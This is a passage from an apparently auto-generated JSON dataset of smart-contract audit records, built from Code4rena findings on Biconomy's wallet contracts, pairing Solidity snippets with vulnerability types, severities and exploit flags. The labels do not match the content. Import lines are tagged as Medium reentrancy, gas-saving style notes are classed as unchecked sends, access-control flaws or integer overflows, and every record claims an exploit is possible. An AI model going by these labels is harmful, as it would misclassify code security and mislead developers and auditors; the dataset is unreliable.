    "code": "2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/BaseSmartAccount.sol::8 => import \"@account-abstraction/contracts/interfaces/IAccount.sol\";\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/BaseSmartAccount.sol::9 => import \"@account-abstraction/contracts/interfaces/IEntryPoint.sol\";\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/Proxy.sol::10 => /* This is the keccak-256 hash of \"biconomy.scw.proxy.implementation\" subtracted by 1, and is validated in the constructor */\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/Proxy.sol::16 => assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(\"biconomy.scw.proxy.implementation\")) - 1));\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::5 => import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::6 => import \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::7 => import \"@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol\";\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::13 => import \"./common/SecuredTokenTransfer.sol\";\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::14 => import \"./interfaces/ISignatureValidator.sol\";\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::16 => import \"@openzeppelin/contracts/utils/cryptography/ECDSA.sol\";\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::40 => //     \"EIP712Domain(uint256 chainId,address verifyingContract)\"\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::46 => //     \"AccountTx(address to,uint256 value,bytes data,uint8 operation,uint256 targetTxGas,uint256 baseGas,uint256 gasPrice,address gasToken,address refundReceiver,uint256 nonce)\"\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::77 => require(msg.sender == owner, \"Smart Account:: Sender is not authorized\");\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::110 => require(_newOwner != address(0), \"Smart Account:: new Signatory address cannot be zero\");\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::128 => require(_newEntryPoint != address(0), \"Smart Account:: new entry point address cannot be zero\");\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountFactory.sol::18 => require(_baseImpl != address(0), \"base wallet address can not be zero\");\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::5 => import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::6 => import \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::7 => import \"@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol\";\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::13 => import \"./common/SecuredTokenTransfer.sol\";\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::14 => import \"./interfaces/ISignatureValidator.sol\";\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::16 => import \"@openzeppelin/contracts/utils/cryptography/ECDSA.sol\";\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::40 => //     \"EIP712Domain(uint256 chainId,address verifyingContract)\"\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::46 => //     \"WalletTx(address to,uint256 value,bytes data,uint8 operation,uint256 targetTxGas,uint256 baseGas,uint256 gasPrice,address gasToken,address refundReceiver,uint256 nonce)\"\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::77 => require(msg.sender == owner, \"Smart Account:: Sender is not authorized\");\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::110 => require(_newOwner != address(0), \"Smart Account:: new Signatory address cannot be zero\");\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::128 => require(_newEntryPoint != address(0), \"Smart Account:: new entry point address cannot be zero\");\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/BasePaymaster.sol::7 => import \"@openzeppelin/contracts/access/Ownable.sol\";\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::15 => import \"../interfaces/IAggregatedAccount.sol\";\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/common/Singleton.sol::9 => /* This is the keccak-256 hash of \"biconomy.scw.proxy.implementation\" subtracted by 1 */\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/common/Singleton.sol::13 => assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(\"biconomy.scw.proxy.implementation\")) - 1));\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/handler/DefaultCallbackHandler.sol::4 => import \"../interfaces/ERC1155TokenReceiver.sol\";\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/handler/DefaultCallbackHandler.sol::5 => import \"../interfaces/ERC721TokenReceiver.sol\";\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/handler/DefaultCallbackHandler.sol::6 => import \"../interfaces/ERC777TokensRecipient.sol\";\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/interfaces/ERC1155TokenReceiver.sol::11 => This function MUST return `bytes4(keccak256(\"onERC1155Received(address,address,uint256,uint256,bytes)\"))` (i.e. 0xf23a6e61) if it accepts the transfer.\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/interfaces/ERC1155TokenReceiver.sol::19 => @return           `bytes4(keccak256(\"onERC1155Received(address,address,uint256,uint256,bytes)\"))`\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/interfaces/ERC1155TokenReceiver.sol::32 => This function MUST return `bytes4(keccak256(\"onERC1155BatchReceived(address,address,uint256[],uint256[],bytes)\"))` (i.e. 0xbc197c81) if it accepts the transfer(s).\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/interfaces/ERC1155TokenReceiver.sol::40 => @return           `bytes4(keccak256(\"onERC1155BatchReceived(address,address,uint256[],uint256[],bytes)\"))`\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/interfaces/ERC721TokenReceiver.sol::16 => /// @return `bytes4(keccak256(\"onERC721Received(address,address,uint256,bytes)\"))`\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/libs/MultiSend.sol::27 => require(address(this) != multisendSingleton, \"MultiSend should only be called via delegatecall\");\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/paymasters/BasePaymaster.sol::7 => import \"@openzeppelin/contracts/access/Ownable.sol\";\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/paymasters/BasePaymaster.sol::8 => import \"@account-abstraction/contracts/interfaces/IPaymaster.sol\";\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/paymasters/BasePaymaster.sol::9 => import \"@account-abstraction/contracts/interfaces/IEntryPoint.sol\";\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/paymasters/PaymasterHelpers.sol::4 => import \"@openzeppelin/contracts/utils/cryptography/ECDSA.sol\";\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/paymasters/PaymasterHelpers.sol::5 => import \"@account-abstraction/contracts/interfaces/UserOperation.sol\";\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol::6 => import \"@openzeppelin/contracts/utils/cryptography/ECDSA.sol\";\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol::7 => import \"@openzeppelin/contracts/proxy/utils/Initializable.sol\";\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol::8 => import \"@openzeppelin/contracts/utils/Address.sol\";\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol::36 => require(address(_entryPoint) != address(0), \"VerifyingPaymaster: Entrypoint can not be zero address\");\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol::37 => require(_verifyingSigner != address(0), \"VerifyingPaymaster: signer of paymaster can not be zero address\");\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol::42 => revert(\"Deposit must be for a paymasterId. Use depositFor\");\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol::49 => require(!Address.isContract(paymasterId), \"Paymaster Id can not be smart contract address\");\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol::50 => require(paymasterId != address(0), \"Paymaster Id can not be zero address\");\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol::66 => require(_newVerifyingSigner != address(0), \"VerifyingPaymaster: new signer can not be zero address\");\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol::106 => // we only \"require\" it here so that the revert reason on invalid signature will be of \"VerifyingPaymaster\", and not \"ECDSA\"\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol::107 => require(sigLength == 64 || sigLength == 65, \"VerifyingPaymaster: invalid signature length in paymasterAndData\");\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol::108 => require(verifyingSigner == hash.toEthSignedMessageHash().recover(paymasterData.signature), \"VerifyingPaymaster: wrong signature\");\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol::109 => require(requiredPreFund <= paymasterIdBalances[paymasterData.paymasterId], \"Insufficient balance for paymaster id\");",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Medium",
    "title": "Findings:",
    "description": "2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/BaseSmartAccount.sol::8 => import \"@account-abstraction/contracts/interfaces/IAccount.sol\"; 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/BaseSmartAccount.sol::9 => import \"@account-abstraction/contracts/interfaces/IEntryPoint.sol\"; 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/Proxy.sol::10 => /* This is the keccak-256 hash of \"biconomy.scw.proxy.implementation\" subtracted by 1, and is validated in the constructor */ 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/Proxy.sol::16 => assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(\"biconomy.scw.proxy.implementation\")) - 1)); 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::5 => import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 58,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::198 => // initial gas = 21k + non_zero_bytes * 16 + zero_bytes * 4\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::199 => //            ~= 21k + calldata.length * [1/3 * 16 + 2/3 * 4]\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::200 => uint256 startGas = gasleft() + 21000 + msg.data.length * 8;\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::201 => //console.log(\"init %s\", 21000 + msg.data.length * 8);\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::198 => // initial gas = 21k + non_zero_bytes * 16 + zero_bytes * 4\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::199 => //            ~= 21k + calldata.length * [1/3 * 16 + 2/3 * 4]\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::200 => uint256 startGas = gasleft() + 21000 + msg.data.length * 8;\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::201 => //console.log(\"init %s\", 21000 + msg.data.length * 8);\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/libs/Math.sol::35 => // (a + b) / 2 can overflow.\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/libs/Math.sol::36 => return (a & b) + (a ^ b) / 2;\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/libs/Math.sol::52 => * @dev Original credit to Remco Bloemen under MIT license (https://xn--2-umb.com/21/muldiv)\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/libs/Math.sol::63 => // variables such that product = prod1 * 2^256 + prod0.\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/libs/Math.sol::170 => // \u2192 `2**(k/2) <= sqrt(a) < 2**((k+1)/2) <= 2**(k/2 + 1)`\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/libs/Math.sol::172 => // Consequently, `2**(log2(a) / 2)` is a good first approximation of `sqrt(a)` with at least 1 correct bit.\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/libs/Math.sol::273 => if (value >= 10**8) {\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/libs/Math.sol::274 => value /= 10**8;\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/libs/Math.sol::277 => if (value >= 10**4) {\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/libs/Math.sol::278 => value /= 10**4;\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/libs/Math.sol::281 => if (value >= 10**2) {\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/libs/Math.sol::282 => value /= 10**2;\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol::97 => function validatePaymasterUserOp(UserOperation calldata userOp, bytes32 /*userOpHash*/, uint256 requiredPreFund)",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "Findings:",
    "description": "2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::198 => // initial gas = 21k + non_zero_bytes * 16 + zero_bytes * 4 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::199 => //            ~= 21k + calldata.length * [1/3 * 16 + 2/3 * 4] 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::200 => uint256 startGas = gasleft() + 21000 + msg.data.length * 8; 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::201 => //console.log(\"init %s\", 21000 + msg.data.length * 8); 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::198 => // initial gas = 21k + non_zero_bytes * 16 + zero_bytes * 4",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 21,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::77 => require(msg.sender == owner, \"Smart Account:: Sender is not authorized\");\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::110 => require(_newOwner != address(0), \"Smart Account:: new Signatory address cannot be zero\");\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::128 => require(_newEntryPoint != address(0), \"Smart Account:: new entry point address cannot be zero\");\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountFactory.sol::18 => require(_baseImpl != address(0), \"base wallet address can not be zero\");\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::77 => require(msg.sender == owner, \"Smart Account:: Sender is not authorized\");\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::110 => require(_newOwner != address(0), \"Smart Account:: new Signatory address cannot be zero\");\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::128 => require(_newEntryPoint != address(0), \"Smart Account:: new entry point address cannot be zero\");\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Gas",
    "title": "[G-03] Long Revert Strings",
    "description": "Shortening revert strings to fit in 32 bytes will decrease gas costs for deployment and gas costs when the revert condition has been met. If the contract(s) in scope allow using Solidity >=0.8.4, consider using Custom Errors as they are more gas efficient while allowing developers to describe the error in detail using NatSpec. 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::77 => require(msg.sender == owner, \"Smart Account:: Sender is not authorized\"); 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::110 => require(_newOwner != address(0), \"Smart Account:: new Signatory address cannot be zero\"); 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::128 => require(_newEntryPoint != address(0), \"Smart Account:: new entry point address cannot be zero\");",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 9,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::455 => function pullTokens(address token, address dest, uint256 amount) external onlyOwner {\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::460 => function execute(address dest, uint value, bytes calldata func) external onlyOwner{\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::465 => function executeBatch(address[] calldata dest, bytes[] calldata func) external onlyOwner{\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::489 => function execFromEntryPoint(address dest, uint value, bytes calldata func, Enum.Operation operation, uint256 gasLimit) external onlyEntryPoint returns (bool success) {\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::445 => function pullTokens(address token, address dest, uint256 amount) external onlyOwner {\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::450 => function execute(address dest, uint value, bytes calldata func) external onlyOwner{\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::455 => function executeBatch(address[] calldata dest, bytes[] calldata func) external onlyOwner{\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::479 => function execFromEntryPoint(address dest, uint value, bytes calldata func, Enum.Operation operation, uint256 gasLimit) external onlyEntryPoint returns (bool success) {\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Gas",
    "title": "[G-06] Functions guaranteed to revert when called by normal users can be marked payable",
    "description": "If a function modifier such as onlyOwner is used, the function will revert if a normal user tries to pay the function. Marking the function as payable will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are CALLVALUE(2),DUP1(3),ISZERO(3),PUSH2(3),JUMPI(10),PUSH1(3),DUP1(3),REVERT(0),JUMPDEST(1),POP(2), which costs an average of about 21 gas per call to the function, in addition to the extra deployment cost 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::455 => function pullTokens(address token, address dest, uint256 amount) external onlyOwner { 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::460 => function execute(address dest, uint value, bytes calldata func) external onlyOwner{ 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::465 => function executeBatch(address[] calldata dest, bytes[] calldata func) external onlyOwner{ 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::489 => function execFromEntryPoint(address dest, uint value, bytes calldata func, Enum.Operation operation, uint256 gasLimit) external onlyEntryPoint returns (bool success) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 10,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::307 => uint8 v;\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::302 => uint8 v;\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Gas",
    "title": "[G-07] Usage of uints/ints smaller than 32 bytes (256 bits) incurs overhead",
    "description": "When using elements that are smaller than 32 bytes, your contract\u2019s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size. 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::307 => uint8 v; 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::302 => uint8 v;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.201,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::216 => nonces[batchId]++;\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::471 => ++i;\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::502 => require(nonces[0]++ == userOp.nonce, \"account: invalid nonce\");\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::216 => nonces[batchId]++;\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::461 => ++i;\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::492 => require(nonces[0]++ == userOp.nonce, \"account: invalid nonce\");\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/base/ModuleManager.sol::124 => moduleCount++;\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Gas",
    "title": "[G-09] ++i/i++ should be unchecked{++i}/unchecked{i++} when it is not possible for them to overflow, for example when used in for- and while-loops",
    "description": "The unchecked keyword is new in solidity version 0.8.0, so this only applies to that version or higher, which these instances are. This saves 30-40 gas per loop 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::216 => nonces[batchId]++; 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::471 => ++i; 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::502 => require(nonces[0]++ == userOp.nonce, \"account: invalid nonce\"); 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::216 => nonces[batchId]++;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 9,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.832,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/Proxy.sol::16 => assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(\"biconomy.scw.proxy.implementation\")) - 1));\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Gas",
    "title": "[G-14] Usage of assert() instead of require()",
    "description": "Between solc 0.4.10 and 0.8.0, require() used REVERT (0xfd) opcode which refunded remaining gas on failure while assert() used INVALID (0xfe) opcode which consumed all the supplied gas. require() should be used for checking error conditions on inputs and return values while assert() should be used for invariant checking (properly functioning code should never reach a failing assert statement, unless there is a bug in your contract you should fix). 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/Proxy.sol::16 => assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(\"biconomy.scw.proxy.implementation\")) - 1));",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.183,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::166 => function init(address _owner, address _entryPointAddress, address _handler) public override initializer {\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::518 => function getDeposit() public view returns (uint256) {\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::525 => function addDeposit() public payable {\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::536 => function withdrawDepositTo(address payable withdrawAddress, uint256 amount) public onlyOwner {\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountFactory.sol::33 => function deployCounterFactualWallet(address _owner, address _entryPoint, address _handler, uint _index) public returns(address proxy){\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountFactory.sol::53 => function deployWallet(address _owner, address _entryPoint, address _handler) public returns(address proxy){\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::166 => function init(address _owner, address _entryPointAddress, address _handler) public override initializer {\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::508 => function getDeposit() public view returns (uint256) {\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::515 => function addDeposit() public payable {\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::526 => function withdrawDepositTo(address payable withdrawAddress, uint256 amount) public onlyOwner {\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/base/FallbackManager.sol::26 => function setFallbackHandler(address handler) public authorized {\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/base/ModuleManager.sol::32 => function enableModule(address module) public authorized {\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/base/ModuleManager.sol::47 => function disableModule(address prevModule, address module) public authorized {\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/base/ModuleManager.sol::105 => function isModuleEnabled(address module) public view returns (bool) {\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Gas",
    "title": "[G-15] Public functions not called by the contract should be declared external instead",
    "description": "Contracts are allowed to override their parents' functions and change the visibility from external to public and can save gas by doing so. 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::166 => function init(address _owner, address _entryPointAddress, address _handler) public override initializer { 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::518 => function getDeposit() public view returns (uint256) { 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::525 => function addDeposit() public payable { 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::536 => function withdrawDepositTo(address payable withdrawAddress, uint256 amount) public onlyOwner {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 16,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
